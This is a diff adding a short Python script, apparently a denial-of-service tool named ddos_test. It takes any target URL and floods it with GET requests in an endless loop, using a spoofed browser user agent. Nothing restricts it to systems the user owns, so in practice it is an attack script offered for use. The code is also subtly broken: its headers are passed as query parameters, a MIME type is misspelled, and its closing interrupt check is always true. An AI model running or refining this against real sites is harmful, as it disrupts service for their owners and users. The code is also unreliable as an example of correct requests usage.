@@ -1,0 +1,39 @@
+#!/usr/bin/python3.13
+import requests
+import sys
+import random
+
+def ddos_test():
+    headers = [
+            ('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'),
+            ('Accept', 'text.html,application.xhtml+xml,application/xml;q=0.9'),
+            ('Connection', 'keep-alive'),
+    ]
+
+    try:
+        target_url = input('Type the target URL: ')
+        if not target_url.startswith(('http://', 'https://')):
+            print('Error: Invalid URL. Please use http:// or https://\n')
+            sys.exit()
+    except Exception as e:
+        print(f'Error: {e}')
+        sys.exit()
+
+    count = 0
+    while True:
+        try:
+            selected_headers = random.sample(headers, 1)
+            headers_list = dict(selected_headers) 
+            r = requests.get(target_url, headers_list)
+
+            if r.status_code == 200:
+                count += 1
+                print(f"Successful request {count}: {r.text}")
+        except KeyboardInterrupt:
+            print(f'\n[!] Ctrl + C Detected!\nExiting...')
+            sys.exit()
+
+if __name__ == "__main__":
+    ddos_test()
+    if KeyboardInterrupt:
+        print('[!]Ctrl + C detected!!\nExiting...')
